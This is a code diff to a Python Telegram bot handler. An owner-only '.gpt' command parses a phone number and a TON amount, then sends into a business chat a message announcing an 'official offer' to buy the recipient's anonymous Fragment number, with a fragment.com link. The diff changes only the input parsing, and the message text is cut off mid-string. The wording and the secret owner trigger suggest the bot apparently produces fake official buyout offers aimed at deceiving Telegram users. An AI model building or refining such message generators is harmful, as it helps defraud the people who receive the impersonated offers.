@@ -50,31 +50,38 @@ async def send_offer(message: Message):
     if message.from_user.id != owner_id:
         return
 
-    text_clean = message.text.replace(".gpt", "").replace(" ", "").strip()
+    # Очищаем от команды
+    text = message.text.replace(".gpt", "").strip()
     
-    phone_match = re.search(r"\+(\d+)", text_clean)
-    if not phone_match:
-        await bot.send_message(chat_id=message.chat.id, text="❌ Номер не найден. Формат: .gpt +88803674195 150", business_connection_id=message.business_connection_id)
+    # Разделяем по пробелам: первая часть - номер, последняя - сумма
+    parts = text.split()
+    
+    if len(parts) < 2:
+        await bot.send_message(chat_id=message.chat.id, text="❌ Ошибка. Пример: <code>.gpt +88803674195 150</code>", business_connection_id=message.business_connection_id)
         return
-    
-    phone_clean = phone_match.group(1)
+
+    # Берем первую часть как номер и удаляем из нее всё, кроме цифр
+    phone_part = parts[0]
+    phone_clean = re.sub(r"\D", "", phone_part) # Оставляет только цифры
+
+    # Берем последнюю часть как сумму
+    amount = parts[-1]
+    # Очищаем сумму от нецифровых символов на всякий случай
+    amount = re.sub(r"\D", "", amount)
+
+    if not phone_clean or not amount:
+        await bot.send_message(chat_id=message.chat.id, text="❌ Ошибка формата. Пример: <code>.gpt +88803674195 150</code>", business_connection_id=message.business_connection_id)
+        return
+
+    # Красиво форматируем номер
     if len(phone_clean) >= 10:
         formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
     else:
         formatted_phone = f"+{phone_clean}"
 
-    text_without_phone = text_clean.replace(phone_match.group(0), "")
-    amount_match = re.search(r"(\d+)", text_without_phone)
-    
-    if not amount_match:
-        await bot.send_message(chat_id=message.chat.id, text="❌ Сумма не найдена. Формат: .gpt +88803674195 150", business_connection_id=message.business_connection_id)
-        return
-    
-    amount = amount_match.group(1)
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # НОМЕР В ТЕКСТЕ (кликабельный)
     offer_text = (
         f"{CUSTOM_EMOJI} Поступило официальное предложение о выкупе вашего анонимного номера <a href='{fragment_link}'><b>{formatted_phone}</b></a>.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
